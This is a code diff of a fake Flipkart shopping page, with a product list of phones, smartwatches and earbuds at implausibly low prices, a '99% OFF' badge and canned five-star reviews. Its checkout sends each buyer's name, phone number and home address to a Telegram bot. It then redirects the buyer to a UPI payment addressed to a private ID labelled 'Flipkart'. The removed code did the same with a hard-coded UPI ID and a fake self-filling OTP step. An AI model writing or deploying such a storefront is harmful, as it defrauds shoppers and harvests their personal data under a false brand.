+            { id: 121, name: "Apple AirPods(2nd gen) with Charging Case Bluetooth Headset with Mic  (White, True Wireless)", price: 149, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/kpinwy80/headphone/x/r/e/mmef2hn-a-apple-original-imag3qe9hphsevrt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/kpinwy80/headphone/x/p/p/mmef2hn-a-apple-original-imag3qe9mmdm2ygg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/kpinwy80/headphone/m/5/1/mmef2hn-a-apple-original-imag3qe993fzdbcz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/kpinwy80/headphone/0/5/r/mmef2hn-a-apple-original-imag3qe9hzgped7q.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/kpinwy80/headphone/f/8/q/mmef2hn-a-apple-original-imag3qe9cjzr3pyd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/kpinwy80/headphone/z/4/x/mmef2hn-a-apple-original-imag3qe93vvmf4mu.jpeg?q=70&crop=false"] },
+            { id: 122, name: "REDMI Watch Move 1.85 Premium AmoLED,14 Day Battery,Best Accuracy,Dual Core Processor Smartwatch  (Silver Sprint Strap, Free Size)", price: 149, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/a/e/t/-original-imahgesvxrpfhymk.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/p/2/w/-original-imahgesvgdbwvtxy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/l/k/6/-original-imahfag2jbgzfsdh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/p/j/u/-original-imahfag2gyxctyud.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/j/7/5/-original-imahgesv7jkdvzh6.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/i/m/-original-imahgesvvng2y8dr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/4/r/f/-original-imahgesvft8ya6p9.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/u/i/k/-original-imahgesv3wgqpzvt.jpeg?q=70&crop=false"] },
+            { id: 123, name: "boAt Storm Infinity, 15 Days Huge Battery 550 mAh, Fast Charge,1.83 (4.64cm) Display Smartwatch  (Deep Blue Strap, Free Size)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/8/w/z/-original-imahamwxdh7tgtzc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/o/o/n/-original-imahah5yyr8ffncb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/o/c/o/-original-imahah5yzaa7nwhb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/1/5/z/-original-imahah5ybehhnaxe.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/5/t/v/-original-imahah5yvzy5qrbg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/d/z/9/-original-imahah5ygb2gh7cj.jpeg?q=70&crop=false"] },
+            { id: 124, name: "Fire-Boltt Ninja Calling Pro 42.9mm (1.69) Bluetooth Calling Smartwatch AI Voice Assistant Smartwatch  (Pink Strap, Free Size)", price: 149, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/3/t/i/-original-imahhyycppzvwxmm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/3/w/i/-original-imahhyycpttg2mw8.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/l/o/e/-original-imahhyychhqhjsqq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/f/z/o/-original-imahhyycck92t544.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/l/o/e/-original-imahhyychhqhjsqq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/9/h/9/-original-imahhyycnddfyv4z.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/y/y/y/-original-imahhyycajrzzzcy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/smartwatch/h/6/x/-original-imahhyycmj8upbgp.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/q/i/i/-original-imahhyyczfkkuauq.jpeg?q=70&crop=false"] },
+            { id: 125, name: "GameSir AMOLED Display, Health & Fitness Tracking, Wireless Charging, Bluetooth Calling Smartwatch  (Green Strap, Free Size)", price: 149, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/128/128/xif0q/smartwatch/0/s/j/49-pf-xtra-storm-metallic-strap-green-02-android-ios-gamesir-yes-original-imahg7bbgh7s9ghd.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/j/j/y/49-pf-xtra-storm-metallic-strap-green-02-android-ios-gamesir-yes-original-imahg7bavfcskztz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/r/z/i/49-pf-xtra-storm-metallic-strap-green-02-android-ios-gamesir-yes-original-imahg7bb6ffpee7c.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/7/l/o/49-pf-xtra-storm-metallic-strap-green-02-android-ios-gamesir-yes-original-imahg7bbufgfrbm4.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/e/p/z/49-pf-xtra-storm-metallic-strap-green-02-android-ios-gamesir-yes-original-imahg7baeszksawq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/7/l/o/49-pf-xtra-storm-metallic-strap-green-02-android-ios-gamesir-yes-original-imahg7bbufgfrbm4.jpeg?q=70&crop=false"] },
+            { id: 126, name: "Apple iPhone 14 (Silver, 512 GB)", price: 799, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/128/128/ktketu80/mobile/6/n/d/iphone-13-mlpg3hn-a-apple-original-imag6vpyghayhhrh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/ktketu80/mobile/a/z/g/iphone-13-mlpg3hn-a-apple-original-imag6vpyxhzdccrc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/ktketu80/mobile/y/g/j/iphone-13-mlpg3hn-a-apple-original-imag6vpyfftrfbzu.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/h/e/g/-original-imagh7g8k7ttcdkc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/w/k/h/-original-imagh2gwxu57j4fn.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/ktketu80/mobile/s/b/v/iphone-13-mlpg3hn-a-apple-original-imag6vpybxyz7wvq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/ktketu80/mobile/8/t/p/iphone-13-mlpg3hn-a-apple-original-imag6vpyhcmvgytj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/ktketu80/mobile/f/t/x/iphone-13-mlpg3hn-a-apple-original-imag6vpyk8g92fpn.jpeg?q=70&crop=false"] },
+            { id: 127, name: "boAt Storm Infinity 15 Days Huge Battery(550 mAh) Fast Charge,1.83 (4.64cm) Display Smartwatch  (Deep Blue Strap, Free Size)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/8/w/z/-original-imahamwxdh7tgtzc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/o/o/n/-original-imahah5yyr8ffncb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/o/c/o/-original-imahah5yzaa7nwhb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/3/f/s/-original-imahah5yzgrxqrjd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/1/5/z/-original-imahah5ybehhnaxe.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/d/z/9/-original-imahah5ygb2gh7cj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/5/t/v/-original-imahah5yvzy5qrbg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/k/s/z/-original-imahage7hzf7nba2.jpeg?q=70&crop=false"] },
+            { id: 128, name: "ZEBRONICS ZEB-SBSPK C12 / ZEB-JUKE BAR 9551 625 W Bluetooth Soundbar  (Black, 5.2 Channel)", price: 209, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/p/o/l/-original-imahgbnqbhkewzyh.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/b/v/y/-original-imahgbnqhhh2tp4d.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/g/b/w/-original-imahgbnqygtkgwhf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/j/g/i/-original-imahgbnq5hwfzwvd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/b/y/7/-original-imahgbnqf2gwth8b.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/100/xif0q/speaker/6/e/x/-original-imahgbnqhw3cbagd.jpeg?q=70&crop=false"] },
+            { id: 129, name: "boAt Chrome Endeavour,1.96 AMOLED Display,AI Coach Health Insights,HRV,VO2 Max,IP68 Smartwatch  (Active Black Strap, Free Size)", price: 299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/f/n/e/-original-imahfuq4mvm5pacs.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/p/d/7/-original-imahfuq4f5u8xnxx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/b/m/-original-imahfuq43gnjfmga.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/n/y/l/-original-imahfuq4sh9ytpzu.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/q/f/n/-original-imahfuq4ntzgc8r8.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/q/l/6/-original-imahfuq4cy8zunme.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/p/j/g/-original-imahfuq4nszdmnsq.jpeg?q=70&crop=false"] },
+            { id: 103, name: "GOBOULT Mustang Torq 60Hrs, App Support, 4Mic ENC, Breathable LED, 5.4v Bluetooth  (Yellow, True Wireless)", price: 249, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/o/d/-original-imahe5gmhgzz7csh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/r/6/s/-original-imahe5gmgzenfnya.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/1/w/-original-imahe5gmkfzgvfpk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/7/b/d/-original-imahe5gm96gffttk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/a/e/r/-original-imahe5gmfycerfjb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/l/o/h/-original-imahe5gmduuubwag.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/o/s/y/-original-imahe5gm3fjgzvyd.jpeg?q=70&crop=false"] },
+            { id: 101, name: "GOBOULT Drift 2, 15 days Battery life, 1.83'' HD Screen, 500Nits Brightness Smartwatch  (Sapphire Strap, Free Size)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/7/d/i/-original-imahfaswpwfdxyqv.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/a/0/-original-imahf9qjpcms7n9p.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/b/q/q/-original-imahf9qjba2bgyt6.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/n/a/x/-original-imahf9qjjhhhavmf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/y/e/l/-original-imahf9qjxykhkpvx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/k/c/-original-imahf9qj95gzhuzx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/o/k/r/-original-imahf9qjynp5njcy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/0/g/s/-original-imahf9qje4quyysu.jpeg?q=70&crop=false"] },
+            { id: 102, name: "Noise Aura Buds with Dual Device Pairing, 60 Hours of Playtime, and ENC with Quad Mic Bluetooth  (Aura White, True Wireless)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/f/f/r/-original-imagzzh2w3wzxuzt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/g/i/g/-original-imahyx2upujyhxkt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/j/8/d/-original-imahyx2u7uwk8guc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/e/y/g/-original-imahyx2u3cdj6bhr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/t/u/i/-original-imahyx2urure8gbr.jpeg?q=70&crop=false"] },
+            { id: 103, name: "CMF by Nothing Buds 2 48 dB Hybrid ANC, Ultra Bass Technology 2.0, 55 Hrs playtime Bluetooth  (Orange, In the Ear)", price: 249, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/h/b/v/-original-imahe29hx7dunuvp.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/h/x/d/-original-imahe29hqvcvddzd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/r/j/x/-original-imahe29h8xspjvbf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/m/g/g/-original-imahe29h4afpdhmg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/3/x/m/-original-imahe29hgu3fus7s.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/3/i/m/-original-imahe29hbzec5d57.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/y/4/g/-original-imahe29hmcm3uanb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/a/l/e/-original-imahe29hrygagyeh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/p/y/1/-original-imahe29hggnxvyyx.jpeg?q=70&crop=false"] },
+            { id: 101, name: "realme Buds T200x with 25dB ANC,12.4mm Dynamic Bass Drivers,48Hrs Playback, BT5.4, IP55 Bluetooth  (Pure Black, True Wireless)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/s/a/i/-original-imahcyy3c5dyfgjt.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/s/b/j/-original-imahcyy3k5xymzzy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/g/8/y/-original-imahcyy3mh9qr7te.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/s/a/p/-original-imahcyy3cw3ehhva.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/t/h/2/-original-imahcyy3caqxhrvc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/e/i/p/-original-imahcyy3wv6hehzd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/t/v/-original-imahcyy3hf2teh4g.jpeg?q=70&crop=false"] },
+            { id: 102, name: "Samsung Galaxy S24 Ultra 5G", price: 1299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70"] },
+            { id: 103, name: "AirPods Pro (2nd Generation)", price: 249, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/p/v/f/-original-imagp9vsq2zyhuvv.jpeg?q=70"] },
+            { id: 101, name: "Apple iPhone 16 Pro Max (Desert Titanium)", price: 1440, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70", "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/5/i/7/-original-imahggexvthqz97h.jpeg?q=70"] },
+            { id: 102, name: "Samsung Galaxy S24 Ultra 5G", price: 1299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70"] },
+            { id: 103, name: "AirPods Pro (2nd Generation)", price: 449, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/p/v/f/-original-imagp9vsq2zyhuvv.jpeg?q=70"] },
+            { id: 101, name: "Apple iPhone 16 Pro Max (Desert Titanium)", price: 1440, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70", "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/5/i/7/-original-imahggexvthqz97h.jpeg?q=70"] },
+            { id: 102, name: "Samsung Galaxy S24 Ultra 5G", price: 1299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70"] },
+            { id: 103, name: "AirPods Pro (2nd Generation)", price: 449, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/p/v/f/-original-imagp9vsq2zyhuvv.jpeg?q=70"] },
+            { id: 101, name: "Apple iPhone 16 Pro Max (Desert Titanium)", price: 1440, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70", "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/5/i/7/-original-imahggexvthqz97h.jpeg?q=70"] },
+            { id: 102, name: "Samsung Galaxy S24 Ultra 5G", price: 1299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70"] }
+           
         ];
 
-        let currentPrice = 0;
-
-        function renderHome(list) {
-            const grid = document.getElementById('productGrid');
-            grid.innerHTML = list.map((p, i) => `
-                <div class="bg-white p-3 border cursor-pointer" onclick="openDetail(${i})">
-                    <img src="${p.images[0]}" class="h-32 mx-auto object-contain">
-                    <p class="text-xs mt-3 truncate font-medium">${p.name}</p>
-                    <p class="font-bold text-sm">₹${p.price.toLocaleString()}</p>
-                </div>
-            `).join('');
+        function loadProducts() {
+            const grid = document.getElementById('main-grid');
+            products.forEach(p => {
+                grid.innerHTML += `
+                    <div class="bg-white p-2 shadow-sm rounded" onclick="openProduct(${p.id})">
+                        <img src="${p.imgs[0]}" class="h-32 w-full object-contain mb-2">
+                        <p class="text-xs font-medium truncate">${p.name}</p>
+                        <div class="flex items-center gap-1 mt-1">
+                            <span class="font-bold text-sm">₹${p.price}</span>
+                            <span class="text-green-600 text-[10px] font-bold">99% OFF</span>
+                        </div>
+                    </div>
+                `;
+            });
         }
 
-        function openDetail(idx) {
-            const p = products[idx];
-            currentPrice = p.price;
-            document.getElementById('homePage').classList.add('hidden');
-            document.getElementById('productPage').classList.remove('hidden');
+        function openProduct(id) {
+            const p = products.find(x => x.id == id);
+            selectedProductPrice = p.price;
+            selectedProductName = p.name;
+            document.getElementById('det-name').innerText = p.name;
+            document.getElementById('det-price').innerText = "₹" + p.price;
             
-            // Detail logic
-            document.getElementById('pTitle').innerText = p.name;
-            document.getElementById('pPrice').innerText = "₹" + p.price.toLocaleString();
-            document.getElementById('mainImg').src = p.images[0];
+            document.getElementById('detail-img-wrapper').innerHTML = p.imgs.map(img => `<div class="swiper-slide"><img src="${img}" class="h-full w-full object-contain"></div>`).join('');
+            
+            document.getElementById('reviews-container').innerHTML = `
+                <div class="border-b pb-2"><p class="font-bold">5 ★ Mind-blowing!</p><p class="text-gray-600">Best deal ever on Flipkart.</p></div>
+                <div class="border-b pb-2"><p class="font-bold">5 ★ Must buy!</p><p class="text-gray-600">Great quality, original product delivered.</p></div>
+            `;
 
-            // Multiple Photos Thumbnail Logic
-            const thumbDiv = document.getElementById('thumbContainer');
-            thumbDiv.innerHTML = p.images.map((img, i) => `
-                <img src="${img}" 
-                     class="h-16 w-16 border p-1 cursor-pointer object-contain rounded-sm ${i===0?'thumb-active':''}" 
-                     onclick="changeImg('${img}', this)">
-            `).join('');
+            showPage('page-detail');
+            new Swiper(".detailSwiper", { pagination: { el: ".swiper-pagination" } });
+        }
 
+        async function checkPincode(pin) {
+            if(pin.length === 6) {
+                document.getElementById('pin-loader').classList.remove('hidden');
+                try {
+                    const res = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
+                    const data = await res.json();
+                    if(data[0].Status === "Success") {
+                        document.getElementById('uCity').value = data[0].PostOffice[0].District;
+                        document.getElementById('uState').value = data[0].PostOffice[0].State;
+                    }
+                } catch(e) {}
+                document.getElementById('pin-loader').classList.add('hidden');
+            }
+        }
+
+        async function sendToTelegram() {
+            const name = document.getElementById('uName').value;
+            const phone = document.getElementById('uPhone').value;
+            const pin = document.getElementById('uPin').value;
+            const city = document.getElementById('uCity').value;
+            const house = document.getElementById('uHouse').value;
+
+            if(!name || phone.length < 10) return alert("Sahi detail bharein!");
+
+            document.getElementById('payBtn').innerText = "Processing...";
+
+            const msg = `📦 *ORDER RECEIVED* 📦\n\n👤 *User:* ${name}\n📞 *Phone:* ${phone}\n🛍️ *Item:* ${selectedProductName}\n💰 *Price:* ₹${selectedProductPrice}\n📍 *Pin:* ${pin}\n🏙️ *City:* ${city}\n🏠 *Addr:* ${house}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                });
+                window.location.href = `upi://pay?pa=${MY_UPI_ID}&pn=Flipkart&am=${selectedProductPrice}&cu=INR`;
+            } catch(e) {
+                window.location.href = `upi://pay?pa=${MY_UPI_ID}&pn=Flipkart&am=${selectedProductPrice}&cu=INR`;
+            }
+        }
+
+        function showPage(id) {
+            document.getElementById('page-home').classList.add('hidden');
+            document.getElementById('page-detail').classList.add('hidden');
+            document.getElementById('page-address').classList.add('hidden');
+            document.getElementById(id).classList.remove('hidden');
             window.scrollTo(0,0);
         }
 
-        function changeImg(src, el) {
-            document.getElementById('mainImg').src = src;
-            document.querySelectorAll('#thumbContainer img').forEach(i => i.classList.remove('thumb-active'));
-            el.classList.add('thumb-active');
-        }
-
-        function openAddress() {
-            document.getElementById('productPage').classList.add('hidden');
-            document.getElementById('checkoutPage').classList.remove('hidden');
-            window.scrollTo(0,0);
-        }
-
-        function showLogin() {
-            if(!document.getElementById('name').value) return alert("Fill Name");
-            document.getElementById('addrBox').classList.add('hidden');
-            document.getElementById('loginBox').classList.remove('hidden');
-        }
-
-        function sendOTP() {
-            const ph = document.getElementById('phone').value;
-            if(ph.length < 10) return alert("Enter 10 digits");
-            document.getElementById('uPh').innerText = ph;
-            document.getElementById('phStep').classList.add('hidden');
-            document.getElementById('otpStep').classList.remove('hidden');
-            setTimeout(() => { document.getElementById('otp').value = "2026"; }, 1500);
-        }
-
-        function finishOrder() {
-            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
-            alert("Order Success!");
-            window.location.href = `upi://pay?pa=8709615634-w350@ybl&pn=Flipkart&am=${currentPrice}&cu=INR`;
-        }
-
-        function searchItems() {
-            const txt = document.getElementById('search').value.toLowerCase();
-            const filtered = products.filter(p => p.name.toLowerCase().includes(txt));
-            renderHome(filtered);
-        }
-
-        renderHome(products);
+        window.onload = () => {
+            loadProducts();
+            new Swiper(".banner-swiper", { pagination: { el: ".swiper-pagination" }, autoplay: true });
+        };
     </script>
 </body>
 </html>
